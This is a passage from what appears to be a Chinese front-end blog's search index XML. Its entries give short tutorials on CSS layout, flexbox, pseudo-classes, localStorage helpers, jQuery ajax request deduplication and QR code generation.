controls[i].spellcheck = false; controls[i].setAttribute("contenteditable","true"); &#125;; var controls = document.getElementsByClassName('crayon-pre'); for(var i=0; i&lt;controls.length; i++)&#123; controls[i].spellcheck = false; controls[i].setAttribute("contenteditable","true"); &#125;;&#125;;window.onload = clrs_code;]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决zepto和jquery的冲突]]></title>
    <url>%2Fblog%2Fjquery%2F%E8%A7%A3%E5%86%B3zepto%E5%92%8Cjquery%E7%9A%84%E5%86%B2%E7%AA%81.html</url>
    <content type="text"><![CDATA[引入顺序：123&lt;script type="text/javascript" src="js/jquery.min.js"&gt;&lt;/script&gt;&lt;script&gt;$.noConflict();&lt;/script&gt;&lt;script type="text/javascript" src="js/zepto.min.js"&gt;&lt;/script&gt; 中间增加：1&lt;script&gt;$.noConflict();&lt;/script&gt; 之后jQuery使用jQuery，Zepto使用Zepto，不再使用$]]></content>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css伪类实现定制单选框样式]]></title>
    <url>%2Fblog%2Fcss%2Fcss%E4%BC%AA%E7%B1%BB%E5%AE%9E%E7%8E%B0%E5%AE%9A%E5%88%B6%E5%8D%95%E9%80%89%E6%A1%86%E6%A0%B7%E5%BC%8F.html</url>
    <content type="text"><![CDATA[原生单选框的样式实在太丑，UI肯定是不会用的啦，他们一般都会重新设计一种单选框，比如下面这种 设计原理使用span模拟一个大圆，再利用::before伪类画一个小圆，实际上是一样大的圆，只是小圆的边框很大，占据一定的位置 1234# HTMLli.pay-source input(type="radio", name="pay-source") span.replace-input 1234567891011121314151617span&#123; display: block; width: 30px; height: 30px; border: 1px solid #ccc; border-radius: 50%;&#125;span::before&#123; display: block; content: ''; width:100%; height: 100%; border: 8px solid #fff; background: #f00; box-sizing: border-box; border-radius: 50%;&#125; 扩展demo123456789101112131415161718192021222324input[type=radio] &#123; //原始input-radio保留但隐藏 position: absolute; visibility: hidden;&#125;input[type=radio] + .replace-input &#123; //input的兄弟接待 假span display: inline-block; width: r(36); height: r(36); border: $border-width solid $color-divider; border-radius: 50%;&#125;input[type=radio]:checked + .replace-input &#123; //被选中的情况下的兄弟节点 假span 的before伪类 &amp;:before &#123; display: block; content: ""; width: 100%; height: 100%; background-color: $red; border-radius: 50%; border: r(7) solid $white; &#125;&#125;]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css布局意外]]></title>
    <url>%2Fblog%2Fcss%2Fcss%E5%B8%83%E5%B1%80%E6%84%8F%E5%A4%96.html</url>
    <content type="text"><![CDATA[css布局的时候经常会有一些意想不到的表现 img下面白条解决办法 1vertical-align: middle /top / bottom; inline-block div导致部分下沉解决办法： 1vertical-align:top;]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS盒模型]]></title>
    <url>%2Fblog%2Fcss%2Fcss%E7%9B%92%E6%A8%A1%E5%9E%8B.html</url>
    <content type="text"><![CDATA[content-box（默认）box-sizing: content-box; 只算内容，表示padding、border、margin不计算在设置的width和height中即 盒模型宽度 = content + padding + border + margin padding-box（不常用）box-sizing: padding-box; 从padding开始算，表示padding计算在设置的width和height中即 盒模型宽度 = content + border + margin border-box（特殊盒模型、开发常用）box-sizing: border-box; 表示padding、border计算在设置的width和height中即 盒模型宽度 = content + margin 开发时常在根元素设置：box-sizing: border-box; 其余元素，设置box-sizing: inherit;继承根部的]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用的css辅助库]]></title>
    <url>%2Fblog%2Fcss%2Fcss%E8%BE%85%E5%8A%A9%E5%BA%93.html</url>
    <content type="text"><![CDATA[pure库（布局）CDN：http://yui.yahooapis.com/pure/0.5.0/pure-min.css meta：&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; 具体操作：http://www.purecss.org/ Font Awesome库（图标）CDN：http://netdna.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css 具体操作：http://fontawesome.dashgame.com/ animate.css（动画）具体操作：https://daneden.github.io/animate.css/ flex.css（布局）Github：https://github.com/lzxb/flex.css/blob/master/docs/zh-ch.md 具体操作:http://lzxb.name/flex.css/]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[flex布局]]></title>
    <url>%2Fblog%2Fcss%2Fflex%E5%B8%83%E5%B1%80.html</url>
    <content type="text"><![CDATA[菜鸟教程 Flex布局语法教程 父容器的属性 给父容器设置 display: flex 或 display: inline-flex 后再设置下列相应的属性。 1234567891011flex: direction: 主轴排列方向jusitfy-content: 主轴的对齐方式align-items: 交叉轴的对齐方式align-content: 多行的flex容器交叉轴对齐方式flex-warp: 定义如何换行flex-flow: flex-direction和flex-warp的简写 1、flex-direction: 主轴排列方向 row: 水平方向，起点在左，默认 row-reverse: 水平方向，起点在右 cloumn: 垂直方向，起点在上 cloumn-reverse: 垂直方向，起点在下 2、jusitfy-content: 主轴的对齐方式 根据 flex-direction 设置的方向来决定，例如 flex-direction 默认为row时，主轴在横轴，flex-direction 设置为column时，主轴在纵轴。 flex-start: 左对齐，往左靠，默认 flex-end: 右对齐，往右靠 center: 居中对齐，往中间靠 space-between: 两端对齐，各个子级间隔相等 space-around: 各个子级两端相等，两侧也有间距 假设主轴为横轴： 3、align-items: 交叉轴的对齐方式 根据 flex-direction 设置的方向来决定，例如 flex-direction 默认为row时，交叉轴在纵轴，flex-direction 设置为column时，交叉轴在横轴。 align-items 属性适用于所有的flex容器，它是用来设置每个flex元素在交叉轴上的默认对齐方式。 flex-start: 顶对齐，往上靠，默认 flex-end: 底对齐，往下靠 center: 垂直居中对齐，往中间靠 baseline: 以第一行文字的基线对齐 stretch: 若未设置高度或auto，将占满整个高度 假设主轴为横轴，交叉轴为纵轴： 4、align-content: 多行的flex容器交叉轴对齐方式 align-content 属性只适用于多行的flex容器，并且当交叉轴上有多余空间使flex容器内的flex线对齐。 对于只有一行的flex元素，align-content 是没有效果的。实现效果基本同 align-items。 通常会用在自动超出换行的时候，如： 1234567&lt;div class="parent"&gt; &lt;div class="child1"&gt;1&lt;/div&gt; &lt;div class="child2"&gt;2&lt;/div&gt; &lt;div class="child3"&gt;3&lt;/div&gt; &lt;div class="child4"&gt;4&lt;/div&gt; &lt;div class="child5"&gt;5&lt;/div&gt;&lt;/div&gt; 1234567891011121314151617181920212223242526272829303132333435.parent &#123; width: 300px; height: 200px; background-color: #ddd; display: flex; flex-direction: row; /* 默认从左到右排列 */ flex-wrap: wrap; /* 自动换行 */ align-content: stretch;&#125;.child1 &#123; height: 20px; width: 80px; background-color: orange;&#125;.child2 &#123; height: 50px; width: 140px; background-color: red;&#125;.child3 &#123; height: 40px; width: 100px; background-color: #08a9b5;&#125;.child4 &#123; height: 60px; width: 70px; background-color: #9ad1c3;&#125;.child5 &#123; height: 30px; width: 140px; background-color: rgb(21, 123, 126);&#125; flex-start: 与交叉轴起点对齐 flex-end: 与交叉轴终点对齐 center: 与交叉轴中点对齐 space-between: 与交叉轴两端对齐 space-around: 每根轴线两端间隔相等 stretch: 元素被拉伸以适应容器，默认。加入元素未沾满纵向空间会自动占满分配该空间（等分），如上图 5、flex-warp: 定义如何换行 no-wrap: 不换行，默认。当容器空间不足时，所有子元素都会按比例缩小。 wrap: 换行，第一行在上 wrap-reverse: 换行，第一行在下 6、flex-flow: &lt;flex-direction&gt;和&lt;flex-warp&gt;的简写连续两个值表示排列方向和如何换行 row nowrap: 水平且不换行，默认… 子级的属性1234567891011order: 定义项目的排列顺序flex-grow: 定义项目的放大比例flex-shrink: 定义了项目的缩小比例flex-basis: 定义了在分配多余空间之前，项目占据的主轴空间flex: flex-grow, flex-shrink 和 flex-basis的简写align-self: 允许单个项目有与其他项目不一样的对齐方式，可覆盖align-items属性 1、order: 定义项目的排列顺序默认是按照DOM的顺序来进行排列的，通过order可以改变这种顺序，类似z-index默认为0，数值越小越靠前，相同数字按照DOM的顺序排列 123.item &#123; order: &lt;integer&gt;; /* default: 0 */&#125; 2、flex-grow: 定义项目的放大比例定义项目的放大比例，默认为0，即如果存在剩余空间，也不放大。如果所有项目的 flex-grow 属性都为1，则它们将等分剩余空间（如果有的话）。如果一个项目的 flex-grow 属性为2，其他项目都为1，则前者占据的剩余空间将比其他项多一倍。如果只有一个项目设置 flex-grow 大于0，即该项目占满剩余空间。通常使用该特性来实行两列或三列自适应布局。 123.item &#123; flex-grow: &lt;number&gt;; /* default: 0 */&#125; 三列布局代码如下： 12345&lt;div class="parent"&gt; &lt;div class="child1"&gt;1&lt;/div&gt; &lt;div class="child2"&gt;2&lt;/div&gt; &lt;div class="child3"&gt;3&lt;/div&gt;&lt;/div&gt; 123456789101112131415161718192021.parent &#123; width: 100%; height: 200px; display: flex;&#125;.child1 &#123; width: 80px; /* 左侧固定了80 */ height: 100px; background-color: red;&#125;.child2 &#123; /*width: 140px;*/ /* 无需设置宽度 */ height: 150px; background-color: green; flex-grow: 1; /* 中间设置flex-grow大于1即可占满中间区域 */&#125;.child3 &#123; width: 100px; /* 右侧固定了100 */ height: 120px; background-color: blue;&#125; 3、flex-shrink: 定义了项目的缩小比例定义项目的缩小比例，默认为1，即如果空间不足，该项目将等比缩小（作用类似于所有的项目设置flex-grow: 1）。如果所有项目的 flex-shrink 属性都为1，当空间不足时，都将等比例缩小。如果所有项目的 flex-shrink 属性都为0，当空间不足时，不缩小，自动超出。如果一个项目的 flex-shrink 属性为0，其他项目都为1，当空间不足时，前者（flex-shrink: 0）不缩小。 123.item &#123; flex-shrink: &lt;number&gt;; /* default: 1 */&#125; 利用felx-sharink也可以实现两列或三列布局，代码如下： 12345&lt;div class="parent"&gt; &lt;div class="child1"&gt;1&lt;/div&gt; &lt;div class="child2"&gt;2&lt;/div&gt; &lt;div class="child3"&gt;3&lt;/div&gt;&lt;/div&gt; 1234567891011121314151617181920212223.parent &#123; width: 100%; height: 200px; display: flex;&#125;.child1 &#123; width: 80px; /* 左侧固定了80 */ height: 100px; background-color: red; flex-shrink: 0; /* 不进行缩放，相当于固定宽度 */&#125;.child2 &#123; width: 100%; /* 中间宽度设置100% */ height: 150px; background-color: green; flex-shrink: 1; /* 默认为1，进行等比缩放 */&#125;.child3 &#123; width: 100px; /* 右侧固定了100 */ height: 120px; background-color: blue; flex-shrink: 0; /* 不进行缩放，相当于固定宽度 */&#125; 4、flex-basis: 定义了在分配多余空间之前，项目占据的主轴空间表示在item被放入flex容器之前的大小，也就是item的理想或者假设大小，但是并不是其真实大小，其真实大小取决于flex容器的宽度。 123.item &#123; flex-basis: &lt;length&gt; | auto; /* default: auto */&#125; width 和 flex-basis 混用：width 失效，以 flex-basis 为准 max-width 和 flex-basis 混用：max-width 决定了item的最大宽度 min-width 和 flex-basis 混用：min-width 决定了item的最小宽度 参考：https://www.jianshu.com/p/bd7d1597d12d 5、flex: flex-grow, flex-shrink 和 flex-basis的简写 123.item &#123; flex: none | [ &lt;'flex-grow'&gt; &lt;'flex-shrink'&gt;? || &lt;'flex-basis'&gt; ] /* default: 0 1 auto */&#125; 6、align-self: 允许单个项目有与其他项目不一样的对齐方式，可覆盖align-items属性 123.item &#123; align-self: auto | flex-start | flex-end | center | baseline | stretch; /* default: auto */&#125;]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[img或div在设置正圆时不圆的处理]]></title>
    <url>%2Fblog%2Fcss%2Fimg%E6%88%96div%E5%9C%A8%E8%AE%BE%E7%BD%AE%E6%AD%A3%E5%9C%86%E6%97%B6%E4%B8%8D%E5%9C%86%E7%9A%84%E5%A4%84%E7%90%86.html</url>
    <content type="text"><![CDATA[img 问题：img设置border-radius: 50%时，当img宽高比较小时，在一些手机上的圆角加边框时，img留有空白 解决办法：在img外面套一个div，div设置box-sizing: content-box或padding-box即可，当box-sizing设置为border-box时，不能实现 div 问题：在一些低版本手机上，如安卓4.2, 设置border-radius:50%,背景会超出，仍然显示一个矩形 解决办法：给div设置background-clip: content-box或padding-box即可，将多余的背景裁掉]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于css定位]]></title>
    <url>%2Fblog%2Fcss%2F%E5%85%B3%E4%BA%8Ecss%E5%AE%9A%E4%BD%8D.html</url>
    <content type="text"><![CDATA[position 属性值的含义： static:默认值没有定位，元素出现在正常的流中（忽略 top, bottom, left, right 或者 z-index 声明）。 relative:生成相对定位的元素相对定位写法：position：relative;通过top,bottom,left,right的设置相对于其正常位置进行定位。可通过z-index进行层次分级。他原本所占的空间扔保留 absolute:生成绝对定位的元素绝对定位写法：position：absolute;相对于 static 定位以外的第一个父元素进行定位。元素的位置通过 “left”, “top”, “right” 以及 “bottom” 属性进行规定。可通过z-index进行层次分级。 fixed:生成固定定位的元素固定定位写法：position:fixed;相对于浏览器窗口进行定位。元素的位置通过 “left”, “top”, “right” 以及 “bottom” 属性进行规定。可通过z-index进行层次分级。 实例参考网站故事版本的介绍实例参考网站]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于居中布局]]></title>
    <url>%2Fblog%2Fcss%2F%E5%85%B3%E4%BA%8E%E5%B1%85%E4%B8%AD%E5%B8%83%E5%B1%80.html</url>
    <content type="text"><![CDATA[《盘点8种CSS实现垂直居中水平居中的绝对定位居中技术》译文：http://blog.csdn.net/freshlover/article/details/11579669原文：http://www.tuicool.com/articles/i6z6Bb 《CSS实现垂直居中的5种方法》http://www.qianduan.net/css-to-achieve-the-vertical-center-of-the-five-kinds-of-methods/ 《CSS布局奇淫技巧之-各种居中》http://www.cnblogs.com/2050/p/3392803.html 《CSS布局奇淫技巧之-宽度自适应》http://www.cnblogs.com/2050/archive/2012/07/30/2614852.html 《CSS布局奇淫技巧之-高度自适应》http://www.cnblogs.com/2050/archive/2012/07/30/2615260.html 《CSS布局奇淫技巧之-多列等高》http://www.cnblogs.com/2050/archive/2012/07/31/2616460.html]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决input-type-number后面的小按钮]]></title>
    <url>%2Fblog%2Fcss%2F%E8%A7%A3%E5%86%B3input-type-number%E5%90%8E%E9%9D%A2%E7%9A%84%E5%B0%8F%E6%8C%89%E9%92%AE.html</url>
    <content type="text"><![CDATA[在使用input type为number时，在输入框的后面会有上下加减按钮，好难看，(v_v)，想去掉，怎么搞？ 增加样式： https://www.zhihu.com/question/26476738/answer/32918388 1234input::-webkit-outer-spin-button,input::-webkit-inner-spin-button &#123; -webkit-appearance: none; &#125; 更换类型使用tel类型代替]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用的js辅助库]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E8%BE%85%E5%8A%A9%E5%BA%93.html</url>
    <content type="text"><![CDATA[微信公号开发CDN:https://dn-falcon.qbox.me/jweixin-1.0.0.js微信分享参考:https://github.com/sdkwe/jswe fastclick（解决300ms延迟）参考链接：https://github.com/ftlabs/fastclickCDN:https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js用法：123456// 使用fastclick解决300ms延迟if ('addEventListener' in document) &#123; document.addEventListener('DOMContentLoaded', function() &#123; FastClick.attach(document.body); &#125;, false);&#125; underscore（JavaScript实用库）链接：http://www.css88.com/doc/underscore/ lodash（JavaScript实用库）链接：http://lodashjs.com/ moment.js（处理时间）链接：http://momentjs.cn/ DateTimePicker（处理日历）链接：http://www.jq22.com/yanshi332 dropload（加载）链接：https://github.com/ximan/dropload swiper（轮播图）链接：http://www.swiper.com.cn/ jquery插件库（插件）链接：http://www.jq22.com/ velocity.js（动画插件）链接：http://julian.com/research/velocity/ vivus（svg动画）链接：https://github.com/maxwellito/vivus snap（svg动画）链接：https://github.com/adobe-webplatform/Snap.svg jFlip（翻书插件）链接：http://www.jquery.info/scripts/jFlip/demo.html math.js（处理数学方法）链接：http://mathjs.org/docs/ SUI Mobile（UI库）链接：http://m.sui.taobao.org/ light7（UI库）链接：http://www.light7.cn/ chart.js（图标）链接：http://www.bootcss.com/p/chart.js/docs/]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[locationStorage用法及扩展]]></title>
    <url>%2Fblog%2Fjavascript%2FlocationStorage%E7%94%A8%E6%B3%95%E5%8F%8A%E6%89%A9%E5%B1%95.html</url>
    <content type="text"><![CDATA[localStorage 和 sessionStorage localStorage为永久性保存 sessionStorage为暂时保存，关闭浏览器后失效 存储单个字符串 12window.localStorage.setItem('name', 'Jack')window.localStorage.getItem('name') 一次存储多个字符串 localStorage只能存储字符串，对于一次性需要存储大量的数据，建议存储为json对象，但使用localStorage必须先经过JSON.stringify()转换成字符串和JSON.parse()解析字符串方可成功，故封装了一个函数local.js，如下： 12345678910111213141516171819const &#123;localStorage, JSON&#125; = window;const storage = &#123; set (key, val = &#123;&#125;) &#123; let _value = JSON.stringify(val); localStorage.setItem(key, _value); &#125;, get (key) &#123; const _value = localStorage.getItem(key); return _value === null ? &#123;&#125; : JSON.parse(_value); // 存空对象和没有存都返回空对象 &#125;, remove (...keys) &#123; keys.forEach(key =&gt; localStorage.removeItem(key)); &#125;, clear () &#123; localStorage.clear(); &#125;&#125;;export default storage; 使用如下： 123456789101112import local from './local.js'let obj = &#123; today: '周五', tommorow: '周六'&#125;local.set('obj', obj); // 存local.get('obj'); // 取local.get('obj').today; // 取local.remove('obj', 'abc'); // 删出俩个local.clear(); // 清空 sessionStorage与之类似， 只是把所有的localStorage换成sessionStorage就行了]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jquery-ajax请求一个时间内只发一次]]></title>
    <url>%2Fblog%2Fjquery%2Fjquery-ajax%E8%AF%B7%E6%B1%82%E4%B8%80%E4%B8%AA%E6%97%B6%E9%97%B4%E5%86%85%E5%8F%AA%E5%8F%91%E4%B8%80%E6%AC%A1.html</url>
    <content type="text"><![CDATA[问题解决解决这种问题有两种方式： 当连续进行多个请求，并且请求的url地址相同时。放弃前面的所有请求，只执行最后一次请求。 当连续进行多个请求，并且请求的url地址相同时。放弃后面的所有请求，只执行第一次请求。 解决方案 将ajax请求的async设置为false 123456789$.ajax(&#123; async: false, type : "POST", url : defaultPostData.url, dataType : 'json', success : function(data) &#123; &#125;&#125;); async:类型：Boolean默认值: true。默认设置下，所有请求均为异步请求。如果需要发送同步请求，请将此选项设置为 false。注意，同步请求将锁住浏览器，用户其它操作必须等待请求完成才可以执行。 利用jquery ajaxPrefilter中断请求 由于第一种方案只是一种曲线救国的方式，其实没能真正的解决上面的问题。所以，建议使用这种方式。 12345678910111213141516171819var pendingRequests = &#123;&#125;;$.ajaxPrefilter(function( options, originalOptions, jqXHR ) &#123; var key = options.url; console.log(key); if (!pendingRequests[key]) &#123; pendingRequests[key] = jqXHR; &#125;else&#123; //jqXHR.abort(); //放弃后触发的提交 pendingRequests[key].abort(); // 放弃先触发的提交 &#125; var complete = options.complete; options.complete = function(jqXHR, textStatus) &#123; pendingRequests[key] = null; if ($.isFunction(complete)) &#123; complete.apply(this, arguments); &#125; &#125;;&#125;); Prefilters是一个预过滤器，在每个请求之前被发送和$.ajax()处理它们前处理。 options 是请求的选项 originalOptions 值作为提供给Ajax方法未经修改的选项，因此，没有ajaxSettings设置中的默认值 jqXHR 是请求的jqXHR对象 以上内容的核心思想是维护一个队列，发送请求时，将请求加入队列，请求响应后，从队列中清除，这就保证了在任一时刻只能有一个同样的请求发送. 局限性：仅仅是前台防止jquery的ajax请求。对于非jquery的ajax请求，不起作用。因为使用的是jquery的ajaxPreFilter函数，仅仅对jquery的ajax请求有作用。 调用abort后jquery会执行error的方法，抛出abort的异常信息。可以使用以下方式区分出该类型的异常。 12345678var ajax = $.ajax(&#123; 'error':function(jqXHR, textStatus, errorThrown)&#123; if(errorThrown != 'abort')&#123; //ajax被调用abort后执行的方法 alert('您的ajax方法被停止了'); &#125; &#125;&#125;) Demo按钮每次点击都会向后端发送请求，下面的demo实现了多次点击按钮之后，只保证最后一次点击的请求能够成功。1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;button id="button1"&gt;button1&lt;/button&gt;&lt;button id="button2"&gt;button2&lt;/button&gt;&lt;button id="button3"&gt;button3&lt;/button&gt; &lt;script&gt; var pendingRequests = &#123;&#125;; jQuery.ajaxPrefilter(function( options, originalOptions, jqXHR ) &#123; var key = options.url; console.log(key); if (!pendingRequests[key]) &#123; pendingRequests[key] = jqXHR; &#125;else&#123; //jqXHR.abort(); //放弃后触发的提交 pendingRequests[key].abort(); // 放弃先触发的提交 &#125; var complete = options.complete; options.complete = function(jqXHR, textStatus) &#123; pendingRequests[key] = null; if (jQuery.isFunction(complete)) &#123; complete.apply(this, arguments); &#125; &#125;; &#125;); &lt;!-- 异步加载应用列表开始 --&gt; $("#button1").live("click", function() &#123; $.ajax('config/ajax/appinfoListFetcher.json', &#123; type:'POST', data: &#123;param1:value1, param2:value2, &#125;, success: function(res)&#123; //后端数据回写到页面中 &#125;, error:function(jqXHR, textStatus, errorThrown)&#123; if(errorThrown != 'abort')&#123; //ajax被调用abort后执行的方法 alert('应用加载失败！'); &#125; &#125; &#125;); &lt;!-- 异步加载应用列表结束 --&gt; &#125;);&lt;/script&gt;]]></content>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jquery-qrcode生成二维码]]></title>
    <url>%2Fblog%2Fjquery%2Fjquery-qrcode%E7%94%9F%E6%88%90%E4%BA%8C%E7%BB%B4%E7%A0%81.html</url>
    <content type="text"><![CDATA[有时候，我们需要在页面上生成一个二维码给用户查看，二维码的信息可以是个链接，也可以是别的。 但是需要可能只是给用户看一下，用户可以选择保存下来，过后并不需要再次打开找到二维码，也就是说生成的二维码是一次性的。 这个时候，我们也就没必要让后端同学生成后返回给我们一个二维码地址，前端可以自己吃用插件生成一个二维码。 资料 用法：http://tt4it.com/exchange/blog/discuss/115/ demo：https://larsjung.de/jquery-qrcode/latest/demo/ 官网：https://larsjung.de/jquery-qrcode/ github：https://github.com/lrsjng/jquery-qrcode CDN：12&lt;script src="http://cdn.bootcss.com/jquery/2.2.4/jquery.js"&gt;&lt;/script&gt;&lt;script src="http://cdn.bootcss.com/lrsjng.jquery-qrcode/0.12.0/jquery.qrcode.min.js"&gt;&lt;/script&gt; 配置12&lt;img src="" id="qr_logo"&gt; &lt;!-- 中间logo，可选 --&gt;&lt;div id="qrcode"&gt;&lt;/div&gt; 12345678$("#qr_code").empty().qrcode(&#123; render: 'image', // 模式，canvas、image、div，注明只有image图片模式才支持长按保存 mode: 0, // 中间的logo, 0表示默认无，1表示满行文字，2表示一定宽的文字，3表示满行方形图片，4表示一定宽的方形图片 image: $("#qr_logo")[0], // 中间的logo minVersion: 8, // 二维码缩放等级 size: 800, // 单位:px，生成的尺寸，注意生成后的清晰度 text: 'no text' // 跳转链接，或显示的文本&#125;); 样式1234#qrcode， #qrcode img&#123; display: block; width: 500px;&#125; 特殊情况当需要在二维码中间插入logo时， 如果是用本地地址，在img中直接使用即可。 如果是用网络地址，二维码中间会出现空白，这是因为初始化的时候网络地址还没加载出来，二维码就已经生成了。可以考虑将网络图片提前使用，使用过一次后图片会被缓存，下次使用会直接用而不会加载。]]></content>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css自定义滚动条]]></title>
    <url>%2Fblog%2Fcss%2Fcss%E8%87%AA%E5%AE%9A%E4%B9%89%E6%BB%9A%E5%8A%A8%E6%9D%A1.html</url>
    <content type="text"><![CDATA[http://www.xuanfengge.com/css3-webkit-scrollbar.html CSS3自定义滚动条样式 -webkit-scrollbar1234567891011121314151617181920/*定义滚动条高宽及背景 高宽分别对应横竖滚动条的尺寸*/::-webkit-scrollbar&#123; width: 0.8rem; height: 0.8rem; background-color: #eee;&#125;/*定义滚动条轨道 内阴影+圆角*/::-webkit-scrollbar-track&#123; -webkit-box-shadow: inset 0 0 0.4rem rgba(0,0,0,0.3); border-radius: 0.8rem; background-color: #eee;&#125;/*定义滑块 内阴影+圆角*/::-webkit-scrollbar-thumb&#123; border-radius: 0.8rem; -webkit-box-shadow: inset 0 0 0.4rem rgba(0,0,0,.3); background-color: #ccc;&#125;]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css设置placeholder]]></title>
    <url>%2Fblog%2Fcss%2Fcss%E8%AE%BE%E7%BD%AEplaceholder.html</url>
    <content type="text"><![CDATA[http://stackoverflow.com/questions/4919680/html5-placeholder-css-padding 123456789101112input::-webkit-input-placeholder &#123; /* WebKit browsers */ line-height: 1.5em;&#125;input:-moz-placeholder &#123; /* Mozilla Firefox 4 to 18 */ line-height: 1.5em;&#125;input::-moz-placeholder &#123; /* Mozilla Firefox 19+ */ line-height: 1.5em;&#125;input:-ms-input-placeholder &#123; /* Internet Explorer 10+ */ line-height: 1.5em;&#125;]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简单h5开发的适配代码]]></title>
    <url>%2Fblog%2Fcss%2Fh5%E5%BC%80%E5%8F%91%E6%97%B6%E7%9A%84%E7%A7%BB%E5%8A%A8%E7%AB%AF%E9%80%82%E9%85%8D%E4%BB%A3%E7%A0%81.html</url>
    <content type="text"><![CDATA[1234567891011121314151617181920212223html&#123;font-size:10px&#125;@media screen and (min-width:321px) and (max-width:375px)&#123; html&#123;font-size:11px&#125;&#125;@media screen and (min-width:376px) and (max-width:414px)&#123; html&#123;font-size:12px&#125;&#125;@media screen and (min-width:415px) and (max-width:639px)&#123; html&#123;font-size:15px&#125;&#125;@media screen and (min-width:640px) and (max-width:719px)&#123; html&#123;font-size:20px&#125;&#125;@media screen and (min-width:720px) and (max-width:749px)&#123; html&#123;font-size:22.5px&#125;&#125;@media screen and (min-width:750px) and (max-width:799px)&#123; html&#123;font-size:23.5px&#125;&#125;@media screen and (min-width:800px)&#123; html&#123;font-size:25px&#125;&#125; 这种做法只适用于单屏显示的h5，一般的移动端开发，我会选择这种做法]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css伪类选择器]]></title>
    <url>%2Fblog%2Fcss%2F%E4%BC%AA%E7%B1%BB%E9%80%89%E6%8B%A9%E5%99%A8.html</url>
    <content type="text"><![CDATA[选择器n的起始值是1 第一个子节点： 1:first-child&#123;&#125; 中间任意子节点： 1:nth-child(n) 奇数（1、3、5…）序号的子节点 1:nth-child(2n-1) 偶数（2、4、6…）序号的子节点 1:nth-child(2n) 第3、6、9…个子节点： 1:nth-child(3n) 中间第2个子节点开始： 1:nth-child(n+1) 第4、7、10…个子节点： 1:nth-child(3n+1) 最后一个子节点： 1:last-chid&#123;&#125; 不是第一个子节点 1&amp;:not(:first-child)&#123;&#125; 不是最后一个子节点 1&amp;:not(:last-child)&#123;&#125; 匹配父元素只有一个子节点的元素（设置在子节点上） 1:only-child&#123;&#125; 选择空元素（包括没有子节点和文本节点）的节点 1:empty&#123;&#125; 选择非*的元素 1:not(p)&#123;&#125; 选择首字母 1:first-letter&#123;&#125; 选择首行 1:first-line&#123;&#125; 在前面插入 123:before&#123; content: '***'&#125; 在后面插入 123:after&#123; content: '***'&#125; 链接按照L-V-H-A的顺序设置 未访问的链接 1a:link &#123;color: #FF0000&#125; 已访问的链接 1a:visited &#123;color: #00FF00&#125; 鼠标移动到链接上 1a:hover &#123;color: #FF00FF&#125; 选定的链接 1a:active &#123;color: #0000FF&#125; 表单 获取获得焦点的元素（链接、输入框等） 1:focus&#123;&#125; 可用的元素 1:enabled&#123;&#125; 不可用的元素 1:disabled&#123;&#125; 被选中的元素 1:checked&#123;&#125; 只读的元素 1:read-only&#123;&#125; 非只读（可读可写）的元素 1:read-write&#123;&#125;]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[伪类画三角箭头]]></title>
    <url>%2Fblog%2Fcss%2F%E4%BC%AA%E7%B1%BB%E5%AE%9E%E7%8E%B0%E4%B8%89%E8%A7%92%E7%AE%AD%E5%A4%B4.html</url>
    <content type="text"><![CDATA[使用before伪类 123456789.box:before&#123; content: ''; border-top: 9px solid transparent;/*方框上部分背景颜色为透明*/ border-bottom: 9px solid transparent;/*方框下部分背景为透明*/ border-right: 9px solid #eee;/*箭头背景颜色*/ position: absolute;/*绝对定位1*/ top: 25px;/*距离顶部位置偏移量2*/ left: -9px;/*距离左边位置偏移量3*/ /*123都是控制显示位置的*/&#125; 使用after伪类 123456789.box:after&#123; content: ''; border-top: 7px solid transparent; border-bottom: 7px solid transparent; border-right: 7px solid #fbfdfb;/*箭头背景颜色，覆盖前面的#eee颜色，使其颜色与整体颜色一致*/ position: absolute; top: 27px; left: -7px;&#125; tip:需要显示朝向那边，就不需要设置哪边的border，其对向的颜色需设置border，两边设置transparent透明,所有效果均为border模拟出来 如：此例箭头朝向左边，也即是border-left不设置，border-right上色，border-top和border-bottom透明]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[去除链接点击后的虚线框]]></title>
    <url>%2Fblog%2Fcss%2F%E5%8E%BB%E9%99%A4PC%E7%AB%AF%E9%93%BE%E6%8E%A5%E7%82%B9%E5%87%BB%E7%9A%84%E8%99%9A%E7%BA%BF%E6%A1%86.html</url>
